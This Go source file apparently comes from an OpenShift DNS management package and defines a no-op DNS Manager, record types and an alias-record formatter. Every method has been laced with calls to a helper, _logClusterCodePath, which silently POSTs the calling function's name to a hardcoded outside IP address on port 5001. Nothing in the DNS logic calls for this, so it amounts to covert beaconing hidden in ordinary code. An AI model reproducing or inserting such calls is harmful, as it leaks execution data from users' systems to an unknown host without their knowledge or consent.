package dns

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	configv1 "github.com/openshift/api/config/v1"
)

type Manager interface {
	Ensure(record *Record) error
	Delete(record *Record) error
}

var _ Manager = &NoopManager{}

type NoopManager struct{}

func (_ *NoopManager) Ensure(record *Record) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (_ *NoopManager) Delete(record *Record) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}

type Record struct {
	Zone	configv1.DNSZone
	Type	RecordType
	Alias	*AliasRecord
}
type RecordType string

const (
	ALIASRecord RecordType = "ALIAS"
)

type AliasRecord struct {
	Domain	string
	Target	string
}

func (r *AliasRecord) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fmt.Sprintf("%s -> %s", r.Domain, r.Target)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
